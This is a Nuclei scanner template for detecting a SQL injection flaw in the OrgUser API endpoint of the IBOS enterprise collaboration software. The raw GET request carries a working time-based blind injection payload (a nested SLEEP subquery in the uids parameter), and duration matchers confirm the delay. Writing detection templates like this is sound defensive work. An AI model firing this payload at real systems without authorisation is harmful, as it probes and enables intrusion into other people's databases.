id: ibos-ecms-orguser-sqli
info:
  name: IBOS Enterprise Collaboration Management Software OrgUser SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    Detects a SQL injection vulnerability in the IBOS Enterprise Collaboration Management Software OrgUser API endpoint.

variables:
  t1: "{{rand_int(2,5)}}"
  t2: "{{to_number(t1) + to_number(t1)}}"
  t3: "{{to_number(t2) + 2}}"

http:
  - raw:
      - |
        GET /?r=main/api/orguser&uids=u_1%27)%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP({{t1}})))a)%20AND%20(%27222%27%3D%27222 HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"isSuccess":true'
      - type: word
        part: header
        words:
          - "application/json"
      - type: dsl
        dsl:
          - "duration > to_number(t2)"
          - "duration < to_number(t3)"
